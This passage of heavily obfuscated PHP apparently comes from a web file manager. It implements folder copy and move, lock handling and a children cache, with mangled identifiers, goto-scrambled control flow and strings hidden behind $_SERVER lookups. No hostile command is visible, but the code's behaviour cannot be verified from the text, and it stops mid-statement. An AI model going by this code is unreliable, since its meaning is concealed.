$EÉáºä‚‹ = $this->sourceInfo($CöˆÏ»Á˜Å); $AÅÒ‘àó¬æ = $eå‹ŠÀÛŠÍ . $féË¡À¶İ¼[101] . $CöˆÏ»Á˜Å; goto fßƒ‹«´¥å; C®İ×àŸ¨˜: CacheLock::setErrorMsg($féË¡À¶İ¼[167] . htmlspecialchars($EÉáºä‚‹[$féË¡À¶İ¼[28]]) . $féË¡À¶İ¼[502] . $aÈ­„µñ”); $this->_lockKey($AÅÒ‘àó¬æ, 1); $this->_lockKey($AÅÒ‘àó¬æ, 0); goto bìà•‹‰Ø¥; fßƒ‹«´¥å: $this->_lockTimeStart[$AÅÒ‘àó¬æ] = timeFloat(); if (!is_array($EÉáºä‚‹)) { return; } $aÈ­„µñ” = LNG($féË¡À¶İ¼[524]); goto C®İ×àŸ¨˜; B¦•×Ã¸—: } private function _lockCheckEnd($f»îâ•Ø®ß, $Dœ½¬‰¤‡) { goto c¾«™Ÿáâ¶; c¾«™Ÿáâ¶: $cºÓÀŒ…© =& $_SERVER[¢Í]; $cƒŠãÎ°ã = $f»îâ•Ø®ß . $cºÓÀŒ…©[101] . $Dœ½¬‰¤‡; CacheLock::setErrorMsg($cºÓÀŒ…©[377]); goto A‰²ì™œ¤; d“ò†î‡Ş¿: if ($eêš°‘ƒ  > 0.5) { unset(self::$cacheSourceInfo[$cºÓÀŒ…©[435] . $Dœ½¬‰¤‡]); } $f‹ËíÂÑ‚Î = $this->sourceInfo($Dœ½¬‰¤‡); if (!$f‹ËíÂÑ‚Î) { show_json(LNG($cºÓÀŒ…©[111]), !1); } goto E’á©ÊÛ¸¸; A‰²ì™œ¤: if (!isset($this->_lockTimeStart[$cƒŠãÎ°ã])) { return; } $eêš°‘ƒ  = timeFloat() - $this->_lockTimeStart[$cƒŠãÎ°ã]; unset($this->_lockTimeStart[$cƒŠãÎ°ã]); goto d“ò†î‡Ş¿; E’á©ÊÛ¸¸: } private function _lockParent($E÷È¿…ˆ©, $e½ê›¿íÚª, $A¢™ÓËŒõ ) { if (!$this->autoLockSet) { return; } $E¹àÍÏğ¬ = $this->sourceInfo($E÷È¿…ˆ©); if (!is_array($E¹àÍÏğ¬)) { return; } $AÂ¤ø§ = array_reverse($this->parentLevelArray($E¹àÍÏğ¬[$_SERVER[¢Í][485]])); foreach ($AÂ¤ø§ as $BÎ¼¢”äĞŞ) { $this->_lockEvent($BÎ¼¢”äĞŞ, $e½ê›¿íÚª, $A¢™ÓËŒõ ); } } private function _lockEvent($b¾ìõĞ¼ª¥, $aµßÅò‹µñ, $BŒãİã§º—) { $fÆÒ¦ŒÍ’ =& $_SERVER[¢Í]; if (!$this->autoLockSet) { return; } foreach ($aµßÅò‹µñ as $Cª¾áõœÂ×) { $aÆ™ˆ«²î = $Cª¾áõœÂ× . $fÆÒ¦ŒÍ’[101] . $b¾ìõĞ¼ª¥; if ($BŒãİã§º— && CacheLock::lockGet($fÆÒ¦ŒÍ’[526] . $aÆ™ˆ«²î)) { continue; } $this->_lockKey($aÆ™ˆ«²î, $BŒãİã§º—); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($BãÍì÷­—, $CÇŒØ‚÷Æ— = 1) { $e©§”Àçö« = $_SERVER[¢Í][526] . md5($BãÍì÷­—); if ($CÇŒØ‚÷Æ—) { if (isset(self::$_lockItemArr[$e©§”Àçö«])) { return; } self::$_lockItemArr[$e©§”Àçö«] = 1; CacheLock::lock($e©§”Àçö«, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$e©§”Àçö«])) { return; } unset(self::$_lockItemArr[$e©§”Àçö«]); CacheLock::unlock($e©§”Àçö«); } } public function isParentOf($BÚ”ãîæ‡, $aÍ¦´ĞÅÓñ) { goto f¤ÉÖŠ·¦ƒ; Dœ†‡Úâ”: $A—‹¼ˆêê = $B ¬„ÚØÄº[$c­ÊÇĞÙŸµ[485]] . $B ¬„ÚØÄº[$c­ÊÇĞÙŸµ[394]] . $c­ÊÇĞÙŸµ[47]; $F±·Ô©ˆµ• = $dÉ¼©¨¥Ğ¡[$c­ÊÇĞÙŸµ[485]] . $dÉ¼©¨¥Ğ¡[$c­ÊÇĞÙŸµ[394]] . $c­ÊÇĞÙŸµ[47]; $f¸£ÛˆÂ° = strpos($F±·Ô©ˆµ•, $A—‹¼ˆêê) === 0; goto a’‡”™Îœ«; f¤ÉÖŠ·¦ƒ: $c­ÊÇĞÙŸµ =& $_SERVER[¢Í]; $B ¬„ÚØÄº = $this->sourceInfo($BÚ”ãîæ‡); $dÉ¼©¨¥Ğ¡ = $this->sourceInfo($aÍ¦´ĞÅÓñ); goto Dœ†‡Úâ”; a’‡”™Îœ«: return $f¸£ÛˆÂ°; goto a“ÍÏ¥”öˆ; a“ÍÏ¥”öˆ: } private $targetIsDelete = 0; public function copy($e·ô³òÄæÅ, $C“„¤ßŠ·ˆ, $E¸Èòë™îÈ = REPEAT_REPLACE, $b¡Ğ¤°À½× = '') { goto AÛ¦âîÅ°¿; BÂºÂìò’¹: if ($Bğ¢ö²÷Û„[$Bƒ£‹ôÈŞ[395]] == $Bƒ£‹ôÈŞ[93] && $aà™ç˜ÁÃÍ == $dÃ¼˜¢ùÊ¶) { $this->folderSizeResetChildren($aà™ç˜ÁÃÍ); } Model($Bƒ£‹ôÈŞ[530])->addAll($fÂÇ•Ã·œ[$Bƒ£‹ôÈŞ[528]], array(), !0); if ($aà™ç˜ÁÃÍ != $dÃ¼˜¢ùÊ¶ || $Bğ¢ö²÷Û„[$Bƒ£‹ôÈŞ[395]] == $Bƒ£‹ôÈŞ[93]) { Model($Bƒ£‹ôÈŞ[531])->eventCopy($dÃ¼˜¢ùÊ¶); } goto cµÚÔğ¯Ü; CÊ±…ßôÙà: $this->_childrenListClear(); $this->lockCopyEnd($e·ô³òÄæÅ); $this->lockWriteEnd($C“„¤ßŠ·ˆ, $d§³è·˜ğ); goto BÂºÂìò’¹; cµÚÔğ¯Ü: $this->saveAll($fÂÇ•Ã·œ[$Bƒ£‹ôÈŞ[529]]); Model($Bƒ£‹ôÈŞ[181])->linkAdd($fÂÇ•Ã·œ[$Bƒ£‹ôÈŞ[527]]); $this->folderSizeReset($C“„¤ßŠ·ˆ); goto CÇ©³¶§Í; d¹‹ôÜ„¥»: $this->targetIsDelete = intval($Bğ¢ö²÷Û„[$Bƒ£‹ôÈŞ[422]]); $aà™ç˜ÁÃÍ = $this->fileNameExistCache($C“„¤ßŠ·ˆ, $Bğ¢ö²÷Û„[$Bƒ£‹ôÈŞ[28]]); $dÃ¼˜¢ùÊ¶ = $this->_copy($e·ô³òÄæÅ, $C“„¤ßŠ·ˆ, $E¸Èòë™îÈ, $fÂÇ•Ã·œ, !0, $b¡Ğ¤°À½×); goto CÊ±…ßôÙà; F‰ÙÔĞÈ¥: if (!$Bğ¢ö²÷Û„ || !$aĞñè³½Íò || $aĞñè³½Íò[$Bƒ£‹ôÈŞ[395]] != $Bƒ£‹ôÈŞ[93]) { return !1; } if ($this->isParentOf($e·ô³òÄæÅ, $C“„¤ßŠ·ˆ)) { return !1; } $d§³è·˜ğ = $b¡Ğ¤°À½× ? $b¡Ğ¤°À½× : $Bğ¢ö²÷Û„[$Bƒ£‹ôÈŞ[28]]; goto Dˆğà‘õ¥©; AÛ¦âîÅ°¿: $Bƒ£‹ôÈŞ =& $_SERVER[¢Í]; $Bğ¢ö²÷Û„ = $this->sourceInfo($e·ô³òÄæÅ); $aĞñè³½Íò = $this->sourceInfo($C“„¤ßŠ·ˆ); goto F‰ÙÔĞÈ¥; Dˆğà‘õ¥©: $this->lockCopyStart($e·ô³òÄæÅ); $this->lockWriteStart($C“„¤ßŠ·ˆ, $d§³è·˜ğ); $fÂÇ•Ã·œ = array($Bƒ£‹ôÈŞ[527] => array(), $Bƒ£‹ôÈŞ[528] => array(), $Bƒ£‹ôÈŞ[529] => array()); goto d¹‹ôÜ„¥»; CÇ©³¶§Í: $this->updateModifyTime($C“„¤ßŠ·ˆ); return $dÃ¼˜¢ùÊ¶; goto F—ÑÀ¹¼İª; F—ÑÀ¹¼İª: } private function _copy($d»Œ•Àê©ó, $a‚¾¨ì°», $d‰ÁóÒ÷çÎ, &$A¥ŒÛ¢±‹Ü, $C‘Œ—ø²¦, $AáåŠÄÎÉ = '') { goto b ¡ùÃ¯×; F‡–—äƒœ‹: if (!$fÀëê±ç¨Œ) { return $this->_copyCreate($d»Œ•Àê©ó, $a‚¾¨ì°», $c»ˆ´äŞ÷õ, $A¥ŒÛ¢±‹Ü); } $C´„ğÔ¨‚ = $fÀëê±ç¨Œ; if ($CÖÈ¦—¬³) { if ($d‰ÁóÒ÷çÎ == REPEAT_RENAME_FOLDER) { $c»ˆ´äŞ÷õ = $this->fileNameAutoCache($a‚¾¨ì°», $c»ˆ´äŞ÷õ, $d‰ÁóÒ÷çÎ, $CÖÈ¦—¬³); $C´„ğÔ¨‚ = $this->_copyCreate($d»Œ•Àê©ó, $a‚¾¨ì°», $c»ˆ´äŞ÷õ, $A¥ŒÛ¢±‹Ü); } else { $A¡ŠêÖâ›À = $this->_childrenList($d»Œ•Àê©ó); foreach ($A¡ŠêÖâ›À as $cÆÕÃ¸‡ğ“) { $this->_copy($cÆÕÃ¸‡ğ“[$DÂ»äŞéƒñ[394]], $fÀëê±ç¨Œ, $d‰ÁóÒ÷çÎ, $A¥ŒÛ¢±‹Ü, !1); } } } else { if ($d‰ÁóÒ÷çÎ == REPEAT_RENAME || $d‰ÁóÒ÷çÎ == REPEAT_RENAME_FOLDER) { $c»ˆ´äŞ÷õ = $this->fileNameAutoCache($a‚¾¨ì°», $c»ˆ´äŞ÷õ, $d‰ÁóÒ÷çÎ, $CÖÈ¦—¬³); $C´„ğÔ¨‚ = $this->_copyCreate($d»Œ•Àê©ó, $a‚¾¨ì°», $c»ˆ´äŞ÷õ, $A¥ŒÛ¢±‹Ü); } else { if ($d‰ÁóÒ÷çÎ == REPEAT_REPLACE) { $BŒ‹Ò÷‰˜È = $this->sourceInfoCache($fÀëê±ç¨Œ); $a‚‹Şé‰ëé = $this->fileHistory($BŒ‹Ò÷‰˜È, $DØàòŞØÈ[$DÂ»äŞéƒñ[444]], $DØàòŞØÈ[$DÂ»äŞéƒñ[87]]); if ($a‚‹Şé‰ëé) { $A¥ŒÛ¢±‹Ü[$DÂ»äŞéƒñ[527]][] = $DØàòŞØÈ[$DÂ»äŞéƒñ[444]]; } } else { if ($d‰ÁóÒ÷çÎ == REPEAT_SKIP) { } } } Hook::trigger($DÂ»äŞéƒñ[532], array($DÂ»äŞéƒñ[533], $DØàòŞØÈ, 0)); } goto cå…ÄœÂŠß; dö§Äˆµ: $c»ˆ´äŞ÷õ = $AáåŠÄÎÉ ? $AáåŠÄÎÉ : $DØàòŞØÈ[$DÂ»äŞéƒñ[28]]; $fÀëê±ç¨Œ = $this->fileNameExistCache($a‚¾¨ì°», $c»ˆ´äŞ÷õ); if ($C‘Œ—ø²¦) { $this->_childrenAllMake($d»Œ•Àê©ó); if ($CÖÈ¦—¬³ && $fÀëê±ç¨Œ) { $this->_childrenAllMake($fÀëê±ç¨Œ); } } goto F‡–—äƒœ‹; b ¡ùÃ¯×: $DÂ»äŞéƒñ =& $_SERVER[¢Í]; $DØàòŞØÈ = $this->sourceInfoCache($d»Œ•Àê©ó); $CÖÈ¦—¬³ = $DØàòŞØÈ[$DÂ»äŞéƒñ[395]] == $DÂ»äŞéƒñ[93]; goto dö§Äˆµ; cå…ÄœÂŠß: return $C´„ğÔ¨‚; goto Aá™„ÇŞÊš; Aá™„ÇŞÊš: } private function _copyCreate($e¤áñ§³ƒå, $D¢›ˆõÔÁ, $CÃ¥åÎà, &$Fê´ÄòÄÏƒ) { goto aì•¶»Û†„; D˜×ÕŠ¿÷: $this->chunkEventSet($D“´Œ¥šÁ“[541], array($D“´Œ¥šÁ“[542], $e¨õ‹éà¦™, $bÆœò¾Šå‹)); $this->saveAll($DÕÓä•‰ß); return $c‹¤ÆÉòĞ»; goto F„§İÆåìƒ; CµæÔë‚Ó: foreach ($a÷ÔÄ±„Õå as $cšòÍåçÀ‚) { $cª¯ğæ½Ê = $cšòÍåçÀ‚[$D“´Œ¥šÁ“[394]]; $e‰ÙØŒïî‡ = $this->_childrenMatch($dš…ÈİŒÓ, $cšòÍåçÀ‚, $C„âë·İÔÚ); $c³‚ª”Ê÷£[] = array($D“´Œ¥šÁ“[394], $cª¯ğæ½Ê, $D“´Œ¥šÁ“[487], $e‰ÙØŒïî‡[$D“´Œ¥šÁ“[487]]); $DÕÓä•‰ß[] = array($D“´Œ¥šÁ“[394], $cª¯ğæ½Ê, $D“´Œ¥šÁ“[485], $e‰ÙØŒïî‡[$D“´Œ¥šÁ“[485]]); $this->_copyApplyMeta($cšòÍåçÀ‚, $Fê´ÄòÄÏƒ); if ($cšòÍåçÀ‚[$D“´Œ¥šÁ“[395]] != $D“´Œ¥šÁ“[93]) { $Fê´ÄòÄÏƒ[$D“´Œ¥šÁ“[527]][] = $cšòÍåçÀ‚[$D“´Œ¥šÁ“[444]]; } } $this->chunkEventSet($D“´Œ¥šÁ“[539], array($D“´Œ¥šÁ“[540], $e¨õ‹éà¦™, $bÆœò¾Šå‹)); $this->saveAll($c³‚ª”Ê÷£); goto D˜×ÕŠ¿÷; aì•¶»Û†„: $D“´Œ¥šÁ“ =& $_SERVER[¢Í]; $DÁ½é¬¡à´ = $this->sourceInfoCache($e¤áñ§³ƒå); $Aêˆ‚ÌŒÀ = $this->sourceInfoCache($D¢›ˆõÔÁ); goto A´ŸÉŠĞº‚; e—…¶¬ÀÃƒ: $C„âë·İÔÚ = $this->sourceInfo($c‹¤ÆÉòĞ»); foreach ($c†«›Ö Ö… as $cšòÍåçÀ‚) { $E¢Èº’Ú¿ã = $this->_makeItemData($cšòÍåçÀ‚, $C„âë·İÔÚ, $cšòÍåçÀ‚[$D“´Œ¥šÁ“[28]]); $E¢Èº’Ú¿ã[$D“´Œ¥šÁ“[485]] = $cšòÍåçÀ‚[$D“´Œ¥šÁ“[485]]; $a¤Ğğ’Ãİ™[] = $E¢Èº’Ú¿ã; } $this->chunkEventSet($D“´Œ¥šÁ“[537], array($D“´Œ¥šÁ“[538], $e¨õ‹éà¦™, $bÆœò¾Šå‹)); goto Dòõõåîè‡; eóè±èé‡: $c‹¤ÆÉòĞ» = $this->add($e¨õ‹éà¦™); $BñÓãÑÕä = array($D“´Œ¥šÁ“[394] => $c‹¤ÆÉòĞ», $D“´Œ¥šÁ“[28] => $CÃ¥åÎà); $this->_copyApplyMeta($BñÓãÑÕä, $Fê´ÄòÄÏƒ); goto DÈØÓ†¤­Æ; d«Ğ¦Ä‹º: $this->_childrenListAll($e¤áñ§³ƒå, $c†«›Ö Ö…); $bÆœò¾Šå‹ = count($c†«›Ö Ö…); if ($bÆœò¾Šå‹ == 0) { return $c‹¤ÆÉòĞ»; } goto e—…¶¬ÀÃƒ; aø«Éç×: $dš…ÈİŒÓ[$e¤áñ§³ƒå] = $c‹¤ÆÉòĞ»; $c³‚ª”Ê÷£ = array(); $DÕÓä•‰ß = array(); goto CµæÔë‚Ó; DÈØÓ†¤­Æ: if ($DÁ½é¬¡à´[$D“´Œ¥šÁ“[395]] != $D“´Œ¥šÁ“[93]) { $Fê´ÄòÄÏƒ[$D“´Œ¥šÁ“[527]][] = $DÁ½é¬¡à´[$D“´Œ¥šÁ“[444]]; return $c‹¤ÆÉòĞ»; } $c†«›Ö Ö… = array(); $a¤Ğğ’Ãİ™ = array(); goto d«Ğ¦Ä‹º; Dòõõåîè‡: $this->addAll($a¤Ğğ’Ãİ™, array(), !1); $a÷ÔÄ±„Õå = $this->where(array($D“´Œ¥šÁ“[487] => $c‹¤ÆÉòĞ»))->select(); $dš…ÈİŒÓ = $this->_childrenMakeRelation($c†«›Ö Ö…, $a÷ÔÄ±„Õå); goto aø«Éç×; A´ŸÉŠĞº‚: $e¨õ‹éà¦™ = $this->_makeItemData($DÁ½é¬¡à´, $Aêˆ‚ÌŒÀ, $CÃ¥åÎà); Hook::trigger($D“´Œ¥šÁ“[534], $e¨õ‹éà¦™); Hook::trigger($D“´Œ¥šÁ“[535], array($D“´Œ¥šÁ“[536], $e¨õ‹éà¦™, 0)); goto eóè±èé‡; F„§İÆåìƒ: } private function _childrenMakeRelation($f³œ’îîÆî, $C×êÛ¤¡èÇ) { $cÑ©‹“‡Õ =& $_SERVER[¢Í]; $EŠÕÀàö = array(); $dğ…ğ¤²ˆñ = array(); foreach ($f³œ’îîÆî as $CŒ¤²‡‹Ì) { $A›ÄÉÔİˆÛ = $CŒ¤²‡‹Ì[$cÑ©‹“‡Õ[28]] . $cÑ©‹“‡Õ[8] . $CŒ¤²‡‹Ì[$cÑ©‹“‡Õ[485]]; $EŠÕÀàö[$A›ÄÉÔİˆÛ] = $CŒ¤²‡‹Ì[$cÑ©‹“‡Õ[394]]; } foreach ($C×êÛ¤¡èÇ as $CŒ¤²‡‹Ì) { $A›ÄÉÔİˆÛ = $CŒ¤²‡‹Ì[$cÑ©‹“‡Õ[28]] . $cÑ©‹“‡Õ[8] . $CŒ¤²‡‹Ì[$cÑ©‹“‡Õ[485]]; $bêĞ¸Šåğ– = $EŠÕÀàö[$A›ÄÉÔİˆÛ]; $dğ…ğ¤²ˆñ[$bêĞ¸Šåğ–] = $CŒ¤²‡‹Ì[$cÑ©‹“‡Õ[394]]; } return $dğ…ğ¤²ˆñ; } private function _childrenMatch($c®İèŒÍ”ç, $E‰µÁ×„Á¥, $bò×³’Ùè²) { goto a‡ÓÏ‚ˆäé; b›ÓØÖ¡‡¢: $b¢¤ÑÄîîš = $E›Õµ°¶[count($E›Õµ°¶) - 1]; return array($dŠñÂÇÇí®[487] => $b¢¤ÑÄîîš, $dŠñÂÇÇí®[485] => $cÆ®Ã­ÙÇ); goto D¯ŠÇöòÖ; a‡ÓÏ‚ˆäé: $dŠñÂÇÇí® =& $_SERVER[¢Í]; $cÆ®Ã­ÙÇ = $bò×³’Ùè²[$dŠñÂÇÇí®[485]]; $cöËº¥Û„… = $this->parentLevelArray($E‰µÁ×„Á¥[$dŠñÂÇÇí®[485]]); goto e¢¶’Êé©¢; e¢¶’Êé©¢: foreach ($cöËº¥Û„… as $Dç‡³‘) { if (isset($c®İèŒÍ”ç[$Dç‡³‘])) { $cÆ®Ã­ÙÇ .= $c®İèŒÍ”ç[$Dç‡³‘] . $dŠñÂÇÇí®[543]; } } $cÆ®Ã­ÙÇ = rtrim($cÆ®Ã­ÙÇ, $dŠñÂÇÇí®[47]) . $dŠñÂÇÇí®[47]; $E›Õµ°¶ = $this->parentLevelArray($cÆ®Ã­ÙÇ); goto b›ÓØÖ¡‡¢; D¯ŠÇöòÖ: } private function _makeItemData($eªŞË‹«Ö, $f¶Ş©›îÊŠ, $AŞä»âá®«) { $F™ñ± ¦…Ÿ =& $_SERVER[¢Í]; $bØ‹ó„·é = array($F™ñ± ¦…Ÿ[544] => $eªŞË‹«Ö[$F™ñ± ¦…Ÿ[395]], $F™ñ± ¦…Ÿ[411] => $AŞä»âá®«, $F™ñ± ¦…Ÿ[545] => $eªŞË‹«Ö[$F™ñ± ¦…Ÿ[397]], $F™ñ± ¦…Ÿ[445] => $eªŞË‹«Ö[$F™ñ± ¦…Ÿ[444]], $F™ñ± ¦…Ÿ[546] => $eªŞË‹«Ö[$F™ñ± ¦…Ÿ[87]], $F™ñ± ¦…Ÿ[547] => $f¶Ş©›îÊŠ[$F™ñ± ¦…Ÿ[396]], $F™ñ± ¦…Ÿ[548] => $f¶Ş©›îÊŠ[$F™ñ± ¦…Ÿ[482]], $F™ñ± ¦…Ÿ[549] => USER_ID, $F™ñ± ¦…Ÿ[550] => USER_ID, $F™ñ± ¦…Ÿ[393] => $f¶Ş©›îÊŠ[$F™ñ± ¦…Ÿ[394]], $F™ñ± ¦…Ÿ[551] => $f¶Ş©›îÊŠ[$F™ñ± ¦…Ÿ[485]] . $f¶Ş©›îÊŠ[$F™ñ± ¦…Ÿ[394]] . $F™ñ± ¦…Ÿ[47], $F™ñ± ¦…Ÿ[421] => 0, $F™ñ± ¦…Ÿ[552] => $F™ñ± ¦…Ÿ[33]); return $bØ‹ó„·é; } private function _copyApplyMeta($FÙõ§Õ¿ƒè, &$bó›£ñİÄ) { $fŒí¦¾ºØÊ =& $_SERVER[¢Í]; $DÍêá‡øó = $FÙõ§Õ¿ƒè[$fŒí¦¾ºØÊ[394]]; $e¨É¶…öêÃ = $FÙõ§Õ¿ƒè[$fŒí¦¾ºØÊ[28]]; if (!isset($FÙõ§Õ¿ƒè[$fŒí¦¾ºØÊ[553]]) || !$FÙõ§Õ¿ƒè[$fŒí¦¾ºØÊ[553]] || $FÙõ§Õ¿ƒè[$fŒí¦¾ºØÊ[553]] == $fŒí¦¾ºØÊ[494]) { $bó›£ñİÄ[$fŒí¦¾ºØÊ[529]][] = array($fŒí¦¾ºØÊ[394], $DÍêá‡øó, $fŒí¦¾ºØÊ[553], short_id($DÍêá‡øó)); } if (Input::check($e¨É¶…öêÃ, $fŒí¦¾ºØÊ[554])) { $bó›£ñİÄ[$fŒí¦¾ºØÊ[528]][] = array($fŒí¦¾ºØÊ[394] => $DÍêá‡øó, $fŒí¦¾ºØÊ[99] => $fŒí¦¾ºØÊ[441], $fŒí¦¾ºØÊ[375] => str_replace($fŒí¦¾ºØÊ[50], $fŒí¦¾ºØÊ[33], Pinyin::encode($e¨É¶…öêÃ))); $bó›£ñİÄ[$fŒí¦¾ºØÊ[528]][] = array($fŒí¦¾ºØÊ[394] => $DÍêá‡øó, $fŒí¦¾ºØÊ[99] => $fŒí¦¾ºØÊ[440], $fŒí¦¾ºØÊ[375] => Pinyin::encode($e¨É¶…öêÃ, $fŒí¦¾ºØÊ[555])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($bßĞ‹Ğ“‰Ä) { goto CÆòŒÔåšÎ; DŸå‹†ÖŸˆ: $BÇ…Á×ÚÎÇ = array($cœ›§®ß••[485] => array($cœ›§®ß••[509], $CŸ÷Ñ‡Î’ä[$cœ›§®ß••[485]] . $bßĞ‹Ğ“‰Ä . $cœ›§®ß••[510]), $cœ›§®ß••[422] => $this->targetIsDelete); $aµ‡©²ê„Í = $this->field($cæ‹›ïìä•)->where($BÇ…Á×ÚÎÇ)->select(); if (!$aµ‡©²ê„Í) { return; } goto AíæÓáÃËæ; AíæÓáÃËæ: $aµ‡©²ê„Í = array_to_keyvalue($aµ‡©²ê„Í, $cœ›§®ß••[394]); foreach ($aµ‡©²ê„Í as $cÁ„åìš¢Ö) { $cŠ¢Œ¾ˆ‚ = $cÁ„åìš¢Ö[$cœ›§®ß••[487]]; $bßĞ‹Ğ“‰Ä = $cÁ„åìš¢Ö[$cœ›§®ß••[394]]; if (!isset($this->_childrenListCache[$bßĞ‹Ğ“‰Ä]) && $cÁ„åìš¢Ö[$cœ›§®ß••[395]] == $cœ›§®ß••[93]) { $this->_childrenListCache[$bßĞ‹Ğ“‰Ä] = array(); } if (!isset($this->_childrenListCache[$cŠ¢Œ¾ˆ‚])) { $this->_childrenListCache[$cŠ¢Œ¾ˆ‚] = array(); } $this->_childrenListCache[$cŠ¢Œ¾ˆ‚][$bßĞ‹Ğ“‰Ä] = $cÁ„åìš¢Ö; $this->_childrenItemCache[$bßĞ‹Ğ“‰Ä] = $cÁ„åìš¢Ö; } goto a‹«¶–Ùö‹; CÆòŒÔåšÎ: $cœ›§®ß•• =& $_SERVER[¢Í]; $CŸ÷Ñ‡Î’ä = $this->sourceInfo($bßĞ‹Ğ“‰Ä); $cæ‹›ïìä• = $cœ›§®ß••[423]; goto DŸå‹†ÖŸˆ; a‹«¶–Ùö‹: } private function _childrenListAll($E»‡ Ãìô², &$cöäóäÕë) { $BÊË‡¤†„ =& $_SERVER[¢Í]; if (!isset($this->_childrenListCache[$E»‡ Ãìô²])) { return; } $Bº©Á•®ù¥ = $this->_childrenListCache[$E»‡ Ãìô²]; foreach ($Bº©Á•®ù¥ as $FÌäù×àº => $EãğĞõ¤¡) { $cöäóäÕë[$FÌäù×àº] = $EãğĞõ¤¡; if ($EãğĞõ¤¡[$BÊË‡¤†„[395]] == $BÊË‡¤†„[93]) { $this->_childrenListAll($FÌäù×àº, $cöäóäÕë); } } } private function sourceInfoCache($bˆ™ÖòÆ¸ô) { if (isset($this->_childrenItemCache[$bˆ™ÖòÆ¸ô])) { return $this->_childrenItemCache[$bˆ™ÖòÆ¸ô]; } return $this->sourceInfo($bˆ™ÖòÆ¸ô); } private function _childrenList($f¬ïÕíºĞ) { if (isset($this->_childrenListCache[$f¬ïÕíºĞ])) { return $this->_childrenListCache[$f¬ïÕíºĞ]; } return $this->_childrenListSelect($f¬ïÕíºĞ); } private function _childrenListSelect($EîÒƒöâ‚—) { goto bÖÛ¡ÆˆÊö; Fõ¨Âãµ˜: foreach ($cÉ“ñ´¥º as $EîÒƒöâ‚— => $dçë‚ç©àÑ) { $this->_childrenItemCache[$EîÒƒöâ‚—] = $dçë‚ç©àÑ; } return $cÉ“ñ´¥º; goto döšŒÌ±ÎÉ; bĞ§ã”œÚ: $bñÆÉĞÉ¿ = $bñÆÉĞÉ¿ ? $bñÆÉĞÉ¿ : array(); $cÉ“ñ´¥º = array_to_keyvalue($bñÆÉĞÉ¿, $eëõ¥õ•ì©[394]); $this->_childrenListCache[$EîÒƒöâ‚—] = $cÉ“ñ´¥º; goto Fõ¨Âãµ˜; bÖÛ¡ÆˆÊö: $eëõ¥õ•ì© =& $_SERVER[¢Í]; $cÑÓ¸Ù¬ƒ = array($eëõ¥õ•ì©[487] => $EîÒƒöâ‚—, $eëõ¥õ•ì©[422] => $this->targetIsDelete); $bñÆÉĞÉ¿ = $this->where($cÑÓ¸Ù¬ƒ)->select(); goto bĞ§ã”œÚ; döšŒÌ±ÎÉ: } private function fileNameExistCache($DŠ©¬õĞ¹‹, $F­œñÊ) { $AÜŒÄÆ“® =& $_SERVER[¢Í]; $F­œñÊ = strtolower($F­œñÊ); $a¿²ŒÂÂ‹È = $this->_childrenList($DŠ©¬õĞ¹‹); foreach ($a¿²ŒÂÂ‹È as $b–¶Çãª“İ) { if ($F­œñÊ == strtolower($b–¶Çãª“İ[$AÜŒÄÆ“®[28]])) { return $b–¶Çãª“İ[$AÜŒÄÆ“®[394]]; } } return !1; } private function fileNameAutoCache($eÉÒê“£ˆ—, $Cò†öÉ¨ğ, $eçöö¾, $aë¤­—à) { $c‚œ¿Ö¶¥ø =& $_SERVER[¢Í]; $aé²£ÑòÃ× = $this->_childrenList($eÉÒê“£ˆ—); $CçÌŒ×‡ = array_to_keyvalue($aé²£ÑòÃ×, $c‚œ¿Ö¶¥ø[33], $c‚œ¿Ö¶¥ø[28]); return $this->fileNameAutoGet($CçÌŒ×‡, $Cò†öÉ¨ğ, $eçöö¾, $aë¤­—à); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($e‡šë«‹œİ, $a¾ÂÑÅ¢¬Š, $DŠ½½Ü•ò‹ = REPEAT_REPLACE, $b¸÷ìÇ±Ä‘ = '') { goto eÑõÏ…Æ£; BÀÒÖ©·õ„: $b²›òÓ‹ŸÔ = $this->fileNameExistCache($a¾ÂÑÅ¢¬Š, $eĞØ‡²…âè[$bˆ­³ª°Ÿ[28]]); $e·§Æµ’Í = $this->_move($e‡šë«‹œİ, $a¾ÂÑÅ¢¬Š, $DŠ½½Ü•ò‹, $F„Œ¢¥£î§, $b¸÷ìÇ±Ä‘); $this->sourceCacheClear(); goto DƒÁ…“õÜ; e›¨÷•Û—¯: $this->lockWriteStart($a¾ÂÑÅ¢¬Š, $aíºË±Šå); $F„Œ¢¥£î§ = array($bˆ­³ª°Ÿ[527] => array(), $bˆ­³ª°Ÿ[558] => !1); $this->clearShare($e‡šë«‹œİ, $a¾ÂÑÅ¢¬Š); goto BÀÒÖ©·õ„; a‰÷§Œ‹…: $this->lockMoveEnd($e‡šë«‹œİ); $this->lockWriteEnd($a¾ÂÑÅ¢¬Š, $aíºË±Šå); $this->folderSizeReset($eĞØ‡²…âè[$bˆ­³ª°Ÿ[487]]); goto Eµº‰«‹Ã; eÑõÏ…Æ£: $bˆ­³ª°Ÿ =& $_SERVER[¢Í]; $eĞØ‡²…âè = $this->sourceInfo($e‡šë«‹œİ); $dãİÔİªÄé = $this->sourceInfo($a¾ÂÑÅ¢¬Š); goto B„ƒßñ„ùô; C®¦â¾î: $this->updateModifyTime($bÏ·Š«’äâ); Model($bˆ­³ª°Ÿ[531])->eventMove($e‡šë«‹œİ, $eĞØ‡²…âè[$bˆ­³ª°Ÿ[487]], $a¾ÂÑÅ¢¬Š); Hook::trigger($bˆ­³ª°Ÿ[557], $E‰—Õ­Ş±ç); goto FÛ¨šˆ‚£Ó; FŒ¸²‘áÈÒ: if (!$eĞØ‡²…âè || !$dãİÔİªÄé || $dãİÔİªÄé[$bˆ­³ª°Ÿ[395]] != $bˆ­³ª°Ÿ[93]) { return !1; } Hook::trigger($bˆ­³ª°Ÿ[556], $E‰—Õ­Ş±ç); $this->targetIsDelete = intval($eĞØ‡²…âè[$bˆ­³ª°Ÿ[422]]); goto Cİ†ó²¨¨; DƒÁ…“õÜ: if ($eĞØ‡²…âè[$bˆ­³ª°Ÿ[395]] == $bˆ­³ª°Ÿ[93] && $b²›òÓ‹ŸÔ) { $this->folderSizeResetChildren($e·§Æµ’Í); } Model($bˆ­³ª°Ÿ[181])->linkAdd($F„Œ¢¥£î§[$bˆ­³ª°Ÿ[527]]); if ($b²›òÓ‹ŸÔ && 